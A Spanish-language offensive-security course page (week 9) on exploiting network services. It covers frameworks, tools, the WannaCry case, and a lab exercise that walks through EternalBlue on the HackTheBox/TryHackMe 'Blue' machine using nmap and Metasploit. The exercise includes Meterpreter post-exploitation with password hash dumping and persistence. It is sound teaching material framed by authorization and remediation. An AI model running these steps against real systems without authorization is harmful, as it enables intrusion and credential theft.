# Semana 9: Explotacion de red y servicios

Curso: [Ciberseguridad Ofensiva: Pensar como Atacante](../syllabus.md) · Semana 9 de 20

## Objetivo de la semana
Comprender y aplicar técnicas de explotación de servicios de red en entornos controlados, identificando vulnerabilidades en protocolos como SMB, RDP, SSH, FTP y servicios web. El estudiante aprenderá a mapear superficies de ataque, seleccionar exploits apropiados y ejecutar post-explotación siguiendo metodologías reconocidas como MITRE ATT&CK y PTES.

## LECTURA
La explotación de red y servicios constituye la fase crítica donde las vulnerabilidades identificadas durante el reconocimiento se convierten en acceso real. Según el marco **MITRE ATT&CK**, esta actividad se alinea con la táctica **TA0001 (Initial Access)** y **TA0008 (Lateral Movement)**, empleando técnicas como **T1190 (Exploit Public-Facing Application)**, **T1210 (Exploitation of Remote Services)** y **T1021 (Remote Services)**. Los servicios expuestos —SMB (445), RDP (3389), SSH (22), FTP (21), WinRM (5985/5986), y aplicaciones web— son vectores primarios porque combinan autenticación débil, software sin parchear y configuraciones erróneas.

El estándar **PTES (Penetration Testing Execution Standard)** divide esta fase en: identificación de vulnerabilidades, validación, y explotación controlada. Complementariamente, **OWASP Top 10** (A03:2021 – Injection, A06:2021 – Vulnerable Components) y **OWASP Testing Guide v4.2** proporcionan metodología para aplicaciones web, mientras que **NIST SP 800-115** define el proceso de evaluación técnica de seguridad. Los **CIS Controls v8** (Control 7: Continuous Vulnerability Management, Control 4: Secure Configuration) establecen el marco defensivo que el pentester debe evadir. **ISO/IEC 27001:2022** (Anexo A.8.8 – Gestión de vulnerabilidades técnicas) exige a las organizaciones identificar y remediar estas exposiciones.

Herramientas clave incluyen **Nmap/NSE** para detección de versiones y scripts, **Metasploit Framework** para armamento y entrega, **CrackMapExec/NetExec** para enumeración y movimiento lateral en Active Directory, **Impacket** para protocolos Windows, **Hydra/Medusa** para fuerza bruta controlada, y **searchsploit/Exploit-DB** para correlación de CVEs. La fase requiere validar CVEs con **CVSS v3.1** para priorizar impacto, y documentar cada acción bajo la metodología **MITRE ATT&CK Navigator**. La ética y el alcance legal (Rules of Engagement, **PTES Pre-engagement**) son no negociables: sin autorización escrita, cualquier explotación constituye un delito conforme a la Convención de Budapest y legislaciones locales.

## EJERCICIO
**Objetivo:** Explotar una máquina vulnerable en laboratorio (recomendado: **HackTheBox – "Blue"** o **TryHackMe – "Blue"** / **"Ice"**) comprometiendo el servicio SMB mediante EternalBlue (MS17-010).

**Pasos:**
1. **Reconocimiento:** `nmap -sV -sC -p- --min-rate 5000 <IP>` identificando SMB (445) y SO Windows 7/Server 2008 R2.
2. **Enumeración SMB:** `nmap --script smb-vuln-ms17-010 -p445 <IP>` para confirmar vulnerabilidad.
3. **Armamento:** En Metasploit, `use exploit/windows/smb/ms17_010_eternalblue`, configurar `RHOSTS`, `LHOST`, `LPORT`.
4. **Explotación:** `run` obteniendo sesión Meterpreter como SYSTEM.
5. **Post-explotación:** `hashdump`, `getuid`, `sysinfo`; escalar persistencia con `run persistence` y documentar.
6. **Reporte:** Registrar cadena de ataque mapeada a MITRE ATT&CK (T1210 → T1059 → T1003) con evidencia y recomendaciones de parcheo (MS17-010 / KB4012598).

**Entregable:** Reporte PDF con timeline, IOCs y matriz ATT&CK Navigator.

## CASO
**Caso WannaCry (2017):** El ransomware WannaCry explotó la vulnerabilidad **MS17-010 (EternalBlue)** en el protocolo SMBv1, filtrada por el grupo Equation Group y publicada por Shadow Brokers. Afectó más de 200.000 sistemas en 150 países, paralizando hospitales del NHS británico, Telefónica, FedEx y Renault. La cadena de ataque siguió: escaneo masivo del puerto 445 → explotación EternalBlue → instalación de DoublePulsar (backdoor) → cifrado de archivos con demanda de rescate en Bitcoin. El fallo no fue solo técnico: organizaciones sin aplicar el parche MS17-010 (publicado dos meses antes por Microsoft) y con SMBv1 habilitado por compatibilidad. Este caso ilustra la táctica **T1210** de MITRE ATT&CK y refuerza los **CIS Controls 4 y 7**. Lecciones: gestión de parches continua, segmentación de red, deshabilitar SMBv1, y monitoreo de tráfico SMB anómalo. En un pentest moderno, replicar este escenario en laboratorio (HTB Blue) permite entender el impacto real de un servicio legado sin proteger.

## Recursos abiertos
- https://attack.mitre.org/techniques/T1210/ — MITRE ATT&CK Exploitation of Remote Services
- https://owasp.org/www-project-web-security-testing-guide/ — OWASP Testing Guide v4.2
- https://github.com/fortra/impacket — Impacket, toolkit para protocolos de red (SMB, MSRPC, Kerberos)

--- [Volver al syllabus](../syllabus.md)
